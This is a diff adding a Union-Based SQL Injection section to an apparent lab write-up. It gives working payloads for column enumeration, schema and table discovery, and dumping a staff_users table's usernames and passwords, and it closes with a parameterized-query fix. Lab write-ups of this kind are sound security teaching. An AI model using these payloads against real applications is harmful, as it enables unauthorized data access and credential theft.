@@ -42,6 +42,7 @@ It is commonly divided into:
 - Error-Based SQL Injection
 - Union-Based SQL Injection
 
+---
 
 ## 2.1 Error-Based SQL Injection
 
@@ -86,6 +87,147 @@ This confirms the existence of an Error-Based SQL Injection vulnerability.
 ### Security Impact
 
 Error messages from the database can expose internal structure and help attackers enumerate the database schema.
+
+---
+## 2.2 Union-Based SQL Injection
+
+Union-Based SQL Injection allows an attacker to combine the results of two SQL queries using the `UNION` operator. This technique is commonly used to extract data directly from the database.
+
+---
+
+### Identifying the number of columns
+
+To successfully use `UNION SELECT`, the number of columns in the original query must match the injected query.
+
+Different payloads were tested:
+
+```sql
+?id=1 UNION SELECT 1
+?id=1 UNION SELECT 1,2
+?id=1 UNION SELECT 1,2,3
+```
+
+The correct number of columns was identified as **3**, as the query stopped returning errors at this stage.
+
+![UNION SELECT column enumeration](images/sqli_union_column-enumeration.png)
+
+---
+
+### Forcing output display
+
+By default, the application displays the first result of the original query. To overwrite this behavior, the original query result was neutralized:
+
+```sql
+0 UNION SELECT 1,2,3
+```
+
+This allowed the injected values to be displayed directly in the response.
+
+![Controlled UNION SELECT output](images/sqli_union_output-control.png)
+
+---
+
+### Extracting database name
+
+The database name was retrieved using the built-in SQL function `database()`:
+
+```sql
+0 UNION SELECT 1,2,database()
+```
+
+This revealed the active database being used by the application.
+
+![Database name extraction](images/sqli_union_database-name.png)
+
+---
+
+### Enumerating database tables
+
+The `information_schema` database was used to retrieve table names:
+
+```sql
+0 UNION SELECT 1,2,group_concat(table_name)
+FROM information_schema.tables
+WHERE table_schema = 'sqli_one'
+```
+
+This query lists all tables accessible in the current database schema.
+
+Result included tables such as:
+- article
+- staff_users
+
+![Database table enumeration](images/sqli_union_table-enumeration.png)
+
+---
+
+### Enumerating columns
+
+Once the relevant table (`staff_users`) was identified, its structure was enumerated:
+
+```sql
+0 UNION SELECT 1,2,group_concat(column_name)
+FROM information_schema.columns
+WHERE table_name = 'staff_users'
+```
+
+This revealed the following columns:
+- id
+- username
+- password
+
+![Column enumeration from staff_users table](images/sqli_union_column-enumeration_staff-users.png)
+
+---
+
+### Extracting credentials
+
+Finally, user credentials were extracted using concatenation techniques:
+
+```sql
+0 UNION SELECT 1,2,
+group_concat(username,':',password SEPARATOR '<br>')
+FROM staff_users
+```
+
+This returned all usernames and passwords stored in the table.
+
+![Credential extraction from staff_users table](images/sqli_union_credential-extraction.png)
+
+---
+
+### Why this works
+
+The vulnerability exists because the application directly concatenates user-controlled input into SQL queries without proper sanitization or parameterization.
+
+As a result, attackers can manipulate the structure of the original query and inject additional SQL statements such as `UNION SELECT`.
+
+--- 
+
+### Vulnerable query example
+
+```sql
+SELECT title, description, author
+FROM articles
+WHERE id = '$id';
+```
+
+If user input is not sanitized, attackers can inject arbitrary SQL statements into the query.
+
+---
+
+### Secure implementation
+
+Parameterized queries (prepared statements) should be used instead of dynamically building SQL queries.
+
+Example:
+
+```python
+query = "SELECT title, description, author FROM articles WHERE id = %s"
+cursor.execute(query, (user_input,))
+```
+
+This ensures that user input is treated strictly as data rather than executable SQL syntax.
 
 ---
 
